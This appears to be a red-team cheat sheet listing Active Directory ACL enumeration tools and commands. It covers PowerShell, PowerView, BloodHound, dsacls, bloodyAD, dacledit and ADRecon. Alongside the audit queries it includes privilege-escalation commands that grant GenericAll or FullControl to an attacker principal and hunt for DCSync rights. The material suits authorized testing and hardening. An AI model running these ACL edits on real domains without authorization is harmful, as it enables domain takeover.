---
aliases:
  - ACL Inspection
  - dsacls
  - Get-Acl AD
  - Get-DomainObjectAcl
tags:
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AD - ACL Enumeration]]"
---
# AD - ACL Enumeration - ACL Inspection Tools

***

## RSAT / PowerShell Native

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-Acl "AD:<DN>"` | DACL del objeto | Per-object audit. |
| `(Get-Acl "AD:<DN>").Access` | ACEs decoded | Standard. |
| `(Get-Acl "AD:<DN>").Owner` | Owner del objeto | Ownership check. |
| `Get-Acl "AD:<DN>" \| Select -Expand Access \| ? IdentityReference -match "<principal>"` | Filter por principal | Targeted. |
| `Get-Acl "AD:<DN>" \| Select -Expand Access \| ? ActiveDirectoryRights -match "GenericAll\|GenericWrite\|WriteDacl\|WriteOwner"` | ACEs peligrosas | Audit. |
| `Set-Acl "AD:<DN>" -AclObject $acl` | Modify (priv) | Privesc step / hardening. |
^ad-acl-tools-rsat

```powershell
# Quick audit ACEs peligrosas en un objeto
Get-Acl "AD:CN=Domain Admins,CN=Users,DC=corp,DC=local" |
  Select -Expand Access |
  Where {
    $_.AccessControlType -eq "Allow" -and
    $_.IdentityReference -notmatch "BUILTIN|NT AUTHORITY|Domain Admins|Enterprise Admins|SYSTEM" -and
    $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner"
  } |
  Select IdentityReference,ActiveDirectoryRights,ObjectType
```

___

## PowerView (Adversary)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-DomainObjectAcl -SamAccountName <name> -ResolveGUIDs` | DACL con GUIDs resueltos | Standard. |
| `Get-DomainObjectAcl -Identity <DN> -ResolveGUIDs` | Por DN | Targeted. |
| `Find-InterestingDomainAcl -ResolveGUIDs` | Bulk hunt ACEs peligrosas | Forest-wide privesc hunt. |
| `Find-InterestingDomainAcl -ResolveGUIDs \| ? IdentityReferenceName -match "<user>"` | Filter post-bulk | Per-principal. |
| `Add-DomainObjectAcl -TargetIdentity <victim> -PrincipalIdentity <atacante> -Rights All` | Add ACE (priv) | Privesc step. |
| `Remove-DomainObjectAcl -TargetIdentity <victim> -PrincipalIdentity <atacante>` | Cleanup | Post-engagement. |
^ad-acl-tools-powerview

```powershell
Import-Module .\PowerView.ps1

# Bulk hunt
Find-InterestingDomainAcl -ResolveGUIDs |
  Where { $_.IdentityReferenceName -notmatch "Domain Admins|Enterprise Admins|SYSTEM" } |
  Select ObjectDN,IdentityReferenceName,ActiveDirectoryRights,ObjectAceType
```

___

## BloodHound (Visual)

| **Cypher** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `MATCH p=(u {owned:true})-[:GenericAll\|GenericWrite\|WriteDacl\|WriteOwner\|ForceChangePassword\|AddMember\|AddSelf\|AllExtendedRights*1..]->(target {highvalue:true}) RETURN p` | Paths owned → high-value via ACL | Privesc planning. |
| `MATCH p=shortestPath((u {owned:true})-[*1..]->(da:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p` | Shortest path a DA | Standard. |
| `MATCH (u)-[r:GenericAll]->(target) WHERE u.domain <> target.domain RETURN u.name,target.name` | Cross-domain ACL | Cross-trust. |
| `MATCH (u)-[r:GetChanges\|GetChangesAll]->(d:Domain) RETURN u.name,d.name` | DCSync rights | Critical hunt. |
^ad-acl-tools-bh

```bash
# SharpHound captures ACL automáticamente con -c All o -c ACL
.\SharpHound.exe -c ACL,Container,Group,ObjectProps
# o Linux
bloodhound-python -d corp.local -u u -p p -ns <DC> -c All --zip
```

___

## dsacls (Native Windows)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `dsacls "<DN>"` | DACL completa native | Sin RSAT. |
| `dsacls "<DN>" /A` | Audit + DACL | Detail. |
| `dsacls "<DN>" /G "<principal>:<rights>"` | Add ACE (priv) | Privesc step. |
| `dsacls "<DN>" /R "<principal>"` | Revoke ACE (priv) | Cleanup. |
| `dsacls "<DN>" \| findstr /i "Authenticated Users\|Domain Users"` | Quick filter wide ACEs | Audit quick. |
^ad-acl-tools-dsacls

```cmd
:: Audit dangerous ACEs en domain root
dsacls "DC=corp,DC=local" | findstr /i "Authenticated Users\|Everyone\|Domain Users"

:: Add GenericAll (privesc)
dsacls "CN=victim,CN=Users,DC=corp,DC=local" /G "corp\atacante:GA"
```

___

## ldapsearch / Linux

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ldapsearch -h <DC> -D 'corp\u' -w pass -b "<DN>" -s base "(objectClass=*)" nTSecurityDescriptor` | Raw security descriptor (binary) | Linux. |
| `bloodyAD --host <DC> -d corp -u u -p pass get object "<DN>" --resolve-sd` | DACL decoded human-readable | Linux standard. |
| `bloodyAD --host <DC> -d corp -u u -p pass add genericAll <victim> <atacante>` | Add ACE | Privesc. |
| `bloodyAD --host <DC> -d corp -u u -p pass remove genericAll <victim> <atacante>` | Remove ACE | Cleanup. |
| `dacledit.py corp.local/u:p -dc-ip <DC> -principal <atacante> -target <victim> -action read` | Read DACL Linux (Impacket-adjacent) | Edge. |
| `dacledit.py corp.local/u:p -dc-ip <DC> -principal <atacante> -target <victim> -rights FullControl -action write` | Write DACL Linux | Privesc. |
^ad-acl-tools-linux

```bash
# bloodyAD — standard Linux ACL audit
bloodyAD --host <DC> -d corp -u auditor -p 'Pass!' \
  get object "CN=Domain Admins,CN=Users,DC=corp,DC=local" --resolve-sd

# dacledit (Impacket-adjacent, krbrelayx project)
git clone https://github.com/dirkjanm/krbrelayx
python3 dacledit.py corp.local/auditor:'Pass!' -dc-ip <DC> \
  -principal atacante -target Administrator -action read
```

___

## ADRecon / Bulk Reports

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `.\ADRecon.ps1 -DomainController <DC> -OutputType Excel` | Excel multi-sheet (incluye `ACLs` sheet) | Auditor-friendly. |
| `.\ADRecon.ps1 ... -Collect ACLs` | Solo ACLs | Targeted. |
| Inspect `ADRecon-Report\CSV-Files\ACLs.csv` | Bulk export | Post-process. |
| `ldapdomaindump 'corp\u:p'@<DC> -o report/` | Includes ACL info en HTML/JSON | Linux equivalent. |
^ad-acl-tools-bulk

```powershell
.\ADRecon.ps1 -DomainController <DC> -Credential (Get-Credential) -OutputType CSV -OutputDir .\report

# Filter dangerous ACEs from bulk
Import-Csv .\report\CSV-Files\ACLs.csv |
  Where {
    $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword" -and
    $_.IdentityReference -notmatch "Domain Admins|Enterprise Admins|SYSTEM|BUILTIN"
  }
```

***
